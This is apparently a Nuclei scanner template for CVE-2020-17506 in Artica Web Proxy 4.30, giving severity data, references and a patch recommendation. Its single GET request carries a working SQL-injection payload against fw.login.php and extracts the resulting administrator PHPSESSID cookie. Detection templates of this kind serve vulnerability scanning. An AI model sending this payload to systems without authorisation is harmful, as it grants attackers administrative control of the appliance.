id: CVE-2020-17506
info:
  name: Artica Web Proxy 4.30 - Authentication Bypass/SQL Injection
  author: dwisiswant0
  severity: critical
  description: A vulnerability in Artica Web Proxy 4.30 allows an attacker to bypass
    authentication and gain administrator privileges through SQL injection.
  reference:
  - https://blog.max0x4141.com/post/artica_proxy/
  - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-17506
  - http://packetstormsecurity.com/files/158868/Artica-Proxy-4.3.0-Authentication-Bypass.html
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2020-17506
    cwe-id: CWE-89
  tags: cve,cve2020,artica,proxy,packetstorm
  metadata:
    impact: The CVE-2020-17506 can have a significant impact on Artica Web Proxy 4.30
      as it allows a remote attacker to bypass authentication and gain web backend
      administrator privileges, potentially causing harm to the system and its users.
    recommendation: It is highly recommended to immediately apply the patch for CVE-2020-17506
      in Artica Web Proxy 4.30 to prevent potential authentication bypass and SQL
      injection attacks.
requests:
- method: GET
  path:
  - '{{BaseURL}}/fw.login.php?apikey=%27UNION%20select%201,%27YToyOntzOjM6InVpZCI7czo0OiItMTAwIjtzOjIyOiJBQ1RJVkVfRElSRUNUT1JZX0lOREVYIjtzOjE6IjEiO30=%27;'
  host-redirects: true
  max-redirects: 1
  matchers-condition: and
  matchers:
  - type: word
    words:
    - artica-applianc
  - type: status
    status:
    - 200
    - 301
    - 302
    condition: or
  - type: word
    part: header
    words:
    - PHPSESSID
  extractors:
  - type: kval
    kval:
    - PHPSESSID
